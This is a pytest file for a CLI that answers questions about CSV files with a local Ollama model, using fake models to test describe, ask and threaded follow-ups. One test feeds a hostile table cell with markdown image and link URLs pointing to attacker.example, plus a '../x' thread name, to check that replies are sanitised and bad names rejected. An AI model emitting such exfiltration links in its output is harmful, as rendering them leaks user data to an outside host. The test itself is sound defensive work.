"""Tests for step C2: ``geekbot csv describe`` and ``geekbot csv ask``.

The CLI is kept offline: the Ollama check is replaced and the real provider is swapped for a fake
model, so no server or GPU is involved. ``result.output`` holds stdout and stderr together, which
is how the user sees them in a terminal.
"""

import asyncio
import json
import os
from collections.abc import Callable
from pathlib import Path
from types import SimpleNamespace
from typing import Any, Self

import pytest
from typer.testing import CliRunner

from csv_analyst.llm.base import LLMProviderError
from geekbot.agent.condense import CondenseOutput
from geekbot.agent.runner import run_turn
from geekbot.agent.runtime import AgentContext, UnavailableChat
from geekbot.cli import app
from geekbot.csv_mode import adapter
from geekbot.csv_mode.adapter import CsvAnalyst
from geekbot.index.lock import StorageLock
from geekbot.llm.models import SwapResult
from geekbot.retrieval import RetrievalResult

FIXTURE = Path(__file__).resolve().parents[1] / "fixtures" / "sales_small.csv"

SQL = "SELECT region, SUM(revenue) AS total FROM data GROUP BY region ORDER BY total DESC"
PLAN = json.dumps(
    {
        "answerability": "answerable",
        "plan": ["sum the revenue per region"],
        "columns_used": ["revenue", "region"],
        "code": SQL,
    }
)
ANSWER = json.dumps({"answer": "North has the highest total revenue, 520."})
REFUSAL = json.dumps(
    {
        "answerability": "data_missing",
        "reason": "There is no salary column.",
        "plan": [],
        "columns_used": [],
        "code": "",
    }
)

runner = CliRunner()


@pytest.fixture(autouse=True)
def _isolated_settings(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    # The CLI builds its own Settings(), which reads GEEKBOT_* variables and a `.env` in the
    # working directory. Neither may leak into the tests.
    for name in list(os.environ):
        if name.startswith("GEEKBOT_"):
            monkeypatch.delenv(name)
    monkeypatch.chdir(tmp_path)


class FakeLLM:
    """A stand-in model: canned replies in order, or an error on every call."""

    def __init__(self, replies: list[str] | None = None, *, error: Exception | None = None) -> None:
        self.replies = list(replies or [])
        self.error = error

    def generate_json(
        self,
        prompt: str,
        *,
        system: str | None = None,
        temperature: float = 0.2,
        seed: int | None = None,
        schema: dict[str, Any] | None = None,
    ) -> str:
        if self.error is not None:
            raise self.error
        return self.replies.pop(0)


def _offline(
    monkeypatch: pytest.MonkeyPatch, fake: FakeLLM, *, problem: str | None = None
) -> list[Path]:
    """Skip the Ollama check and use ``fake`` as the model. Returns the files that got opened."""
    opened: list[Path] = []
    monkeypatch.setattr(adapter, "find_problem", lambda settings, **kwargs: problem)
    real_open: Callable[..., CsvAnalyst] = CsvAnalyst.open.__func__  # type: ignore[attr-defined]

    def open_with_fake(cls: type[CsvAnalyst], path: Path, settings: Any, **kwargs: Any) -> Any:
        opened.append(path)
        return real_open(cls, path, settings, provider=fake)

    monkeypatch.setattr(CsvAnalyst, "open", classmethod(open_with_fake))
    return opened


# --- csv describe ---------------------------------------------------------------------------


def test_describe_prints_what_was_loaded() -> None:
    result = runner.invoke(app, ["csv", "describe", str(FIXTURE)])
    assert result.exit_code == 0
    assert "sales_small.csv" in result.output
    assert "12 rows, 4 columns" in result.output


def test_describe_of_a_missing_file_is_a_usage_error(tmp_path: Path) -> None:
    result = runner.invoke(app, ["csv", "describe", str(tmp_path / "nope.csv")])
    assert result.exit_code == 2


def test_describe_of_an_unusable_file_exits_1_with_one_error_line(tmp_path: Path) -> None:
    empty = tmp_path / "empty.csv"
    empty.write_bytes(b"")
    result = runner.invoke(app, ["csv", "describe", str(empty)])
    assert result.exit_code == 1
    assert "error:" in result.output


# --- csv ask --------------------------------------------------------------------------------


def test_ask_prints_the_reply_and_a_footer_naming_the_model(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _offline(monkeypatch, FakeLLM([PLAN, PLAN, ANSWER]))
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "Which region sells the most?"])
    assert result.exit_code == 0
    assert "North" in result.output
    assert "[csv] model=qwen2.5-coder:3b profile=proto status=answered time=" in result.output
    assert "model_load=0ms" in result.output


def test_a_reply_that_repeats_a_hostile_cell_is_cleaned_before_it_is_printed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """G3 (S3.5): the one-off command bypasses the graph, so it cleans the reply itself."""
    hostile = "| note |\n|---|\n| ![x](https://attacker.example/s?q=1) |\n| [r](https://attacker.example/r) |"

    class Stub:
        def __enter__(self) -> Self:
            return self

        def __exit__(self, *exc: object) -> None:
            return None

        def ask(self, question: str) -> Any:
            return SimpleNamespace(
                markdown=hostile,
                model="m",
                status="answered",
                failed=False,
                seconds=0.1,
                model_load_ms=0,
            )

    monkeypatch.setattr(adapter, "find_problem", lambda settings, **kwargs: None)
    monkeypatch.setattr(CsvAnalyst, "open", classmethod(lambda cls, path, settings, **kw: Stub()))
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "Show the notes."])
    assert result.exit_code == 0
    assert "attacker" not in result.stdout and "![" not in result.stdout
    assert "| r |" in result.stdout  # the link text stays
    assert "removed from the reply" in result.stderr


def test_a_question_the_data_cannot_answer_still_exits_0(monkeypatch: pytest.MonkeyPatch) -> None:
    _offline(monkeypatch, FakeLLM([REFUSAL, REFUSAL]))
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "What is the average salary?"])
    assert result.exit_code == 0
    assert "There is no salary column." in result.output
    assert "status=abstained" in result.output


def test_a_failed_question_exits_1(monkeypatch: pytest.MonkeyPatch) -> None:
    _offline(monkeypatch, FakeLLM(error=LLMProviderError("the model is down")))
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "Which region sells the most?"])
    assert result.exit_code == 1
    assert "status=failed" in result.output


def test_ask_stops_early_when_ollama_or_the_model_is_not_ready(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    problem = "the CSV model qwen2.5-coder:3b is not pulled: run `ollama pull qwen2.5-coder:3b`"
    opened = _offline(monkeypatch, FakeLLM(), problem=problem)
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "Which region sells the most?"])
    assert result.exit_code == 1
    assert f"error: {problem}" in result.output
    assert opened == []  # the CSV was never even loaded


def test_ask_with_a_missing_file_is_a_usage_error(tmp_path: Path) -> None:
    result = runner.invoke(app, ["csv", "ask", str(tmp_path / "nope.csv"), "anything?"])
    assert result.exit_code == 2


def test_ask_needs_a_question() -> None:
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE)])
    assert result.exit_code == 2


# --- csv ask --thread (step C4) -------------------------------------------------------------
# The same offline setup as above, plus a fake Ollama client, a fake model swap and a fake rewrite
# model: what runs for real is the command, the answer graph in CSV mode and the saved thread.

FOLLOW_UP = "And which has the most?"
REWRITE = "Which region has the highest total revenue?"
TURN = [PLAN, PLAN, ANSWER]  # what the package's model says for one answered question


class RecordingLLM(FakeLLM):
    """Like ``FakeLLM``, and keeps every prompt it is given."""

    def __init__(self, replies: list[str] | None = None, *, error: Exception | None = None) -> None:
        super().__init__(replies, error=error)
        self.prompts: list[str] = []

    def generate_json(self, prompt: str, **kwargs: Any) -> str:
        self.prompts.append(prompt)
        return super().generate_json(prompt, **kwargs)


class FakeCondenser:
    def __init__(self) -> None:
        self.calls: list[Any] = []

    def invoke(self, messages: Any, /) -> Any:
        self.calls.append(messages)
        return CondenseOutput(standalone_question=REWRITE)


@pytest.fixture
def threaded(monkeypatch: pytest.MonkeyPatch) -> SimpleNamespace:
    """What the thread path did with Ollama: the swaps it made and the rewrite models it built."""
    state = SimpleNamespace(swaps=[], made=[], condenser=FakeCondenser())

    class FakeClient:
        def __init__(self, host: str) -> None:
            self.host = host

        def __enter__(self) -> Self:
            return self

        def __exit__(self, *exc: object) -> None:
            return None

    def swap(_client: object, _settings: object, mode: str, **_: object) -> SwapResult:
        state.swaps.append(mode)
        return SwapResult(
            loaded="qwen2.5-coder:3b", unloaded=("gemma3:4b",), unload_s=0.1, warm_up_s=1.2
        )

    def make_structured(_settings: object, schema: object, **kwargs: object) -> FakeCondenser:
        state.made.append({"schema": schema, **kwargs})
        return state.condenser

    monkeypatch.setattr("geekbot.cli.OllamaClient", FakeClient)
    monkeypatch.setattr("geekbot.llm.models.swap_to_mode", swap)
    monkeypatch.setattr("geekbot.llm.chat.make_structured_model", make_structured)
    return state


def csv_ask_in(thread: str, question: str = "Which region sells the most?") -> Any:
    return runner.invoke(app, ["csv", "ask", str(FIXTURE), question, "--thread", thread])


def test_a_csv_thread_loads_the_csv_model_answers_and_remembers_the_turn(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    _offline(monkeypatch, FakeLLM(TURN))
    result = csv_ask_in("t1")
    assert result.exit_code == 0, result.output
    assert "qwen2.5-coder:3b ready (1.2 s to load, unloaded gemma3:4b)" in result.output
    assert "North" in result.output
    assert "csv status: answered" in result.output
    assert (
        "thread t1 (csv): turn 1, 2 messages remembered, taint TOOL, USER (tainted)"
        in result.output
    )
    assert threaded.swaps == ["csv"]
    assert threaded.condenser.calls == []  # the first question of a thread makes no rewrite call


def test_a_csv_follow_up_is_rewritten_and_the_package_is_asked_the_full_question(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    llm = RecordingLLM(TURN + TURN)  # one fake for both turns: `_offline` cannot be applied twice
    _offline(monkeypatch, llm)
    assert csv_ask_in("t1").exit_code == 0
    first_turn_prompts = len(llm.prompts)
    result = csv_ask_in("t1", FOLLOW_UP)
    assert result.exit_code == 0, result.output
    assert len(threaded.condenser.calls) == 1
    assert f'asked as: "{REWRITE}"' in result.output
    second_turn = llm.prompts[first_turn_prompts:]
    assert REWRITE in second_turn[0]  # the package saw the full question, not the fragment
    assert all(FOLLOW_UP not in prompt for prompt in second_turn)
    assert "thread t1 (csv): turn 2, 4 messages remembered" in result.output


def test_the_rewrite_uses_the_csv_model_and_the_context_size_it_was_warmed_up_with(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    """R-2: a different ``num_ctx`` would make Ollama reload the model for the rewrite."""
    _offline(monkeypatch, FakeLLM(TURN))
    csv_ask_in("t1")
    (made,) = threaded.made
    assert made["model"] == "qwen2.5-coder:3b"
    assert made["num_ctx"] == 16384
    assert made["num_predict"] == 96


def test_thread_show_names_the_mode_and_the_file_and_the_tool_label(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    _offline(monkeypatch, FakeLLM(TURN))
    csv_ask_in("t1")
    result = runner.invoke(app, ["thread", "show", "t1"])
    assert result.exit_code == 0, result.output
    assert "thread t1 (csv, sales_small.csv): 1 turns, 2 messages remembered" in result.output
    assert "t1-user [USER] Which region sells the most?" in result.output
    assert "t1-assistant [TOOL, USER]" in result.output
    assert "taint: TOOL, USER" in result.output


def test_a_failed_question_still_exits_1_and_is_part_of_the_thread(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    _offline(monkeypatch, FakeLLM(error=LLMProviderError("the model is down")))
    result = csv_ask_in("t1")
    assert result.exit_code == 1
    assert "csv status: failed" in result.output
    assert runner.invoke(app, ["thread", "show", "t1"]).exit_code == 0  # the turn was remembered


def test_a_chat_thread_cannot_be_continued_as_csv_and_nothing_is_loaded(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace, tmp_path: Path
) -> None:
    class FindsNothing:
        def search(self, query: str, k: int) -> RetrievalResult:
            return RetrievalResult(chunks=())

    chat = AgentContext(
        retriever=FindsNothing(),
        llm=UnavailableChat(),
        model="m",
        top_k=1,
        context_budget_tokens=3000,
    )
    threads_db = tmp_path / "data" / "threads.db"
    asyncio.run(
        run_turn("anything?", context=chat, thread="t1", threads_db=threads_db, mode="chat")
    )
    opened = _offline(monkeypatch, FakeLLM(TURN))
    result = csv_ask_in("t1")
    assert result.exit_code == 1
    assert "chat conversation and cannot become a csv one" in result.output
    assert threaded.swaps == []
    assert opened == []  # the CSV was not even loaded


def test_the_thread_name_and_the_question_are_checked_before_any_model_is_loaded(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace
) -> None:
    opened = _offline(monkeypatch, FakeLLM(TURN))
    bad_name = csv_ask_in("../x")
    assert bad_name.exit_code == 1
    assert "not a usable thread name" in bad_name.output
    empty = csv_ask_in("t1", "   ")
    assert empty.exit_code == 1
    assert "the question is empty" in empty.output
    assert threaded.swaps == []
    assert opened == []


def test_a_second_process_on_the_storage_is_refused_before_anything_loads(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace, tmp_path: Path
) -> None:
    opened = _offline(monkeypatch, FakeLLM(TURN))
    (tmp_path / "data").mkdir()
    with StorageLock(tmp_path / "data"):
        result = csv_ask_in("t1")
    assert result.exit_code == 1
    assert "error:" in result.output
    assert threaded.swaps == []
    assert opened == []


def test_without_a_thread_nothing_changes_no_swap_no_rewrite_model_no_file(
    monkeypatch: pytest.MonkeyPatch, threaded: SimpleNamespace, tmp_path: Path
) -> None:
    _offline(monkeypatch, FakeLLM(TURN))
    result = runner.invoke(app, ["csv", "ask", str(FIXTURE), "Which region sells the most?"])
    assert result.exit_code == 0, result.output
    assert "[csv] model=qwen2.5-coder:3b" in result.output
    assert threaded.swaps == []
    assert threaded.made == []
    assert not (tmp_path / "data" / "threads.db").exists()
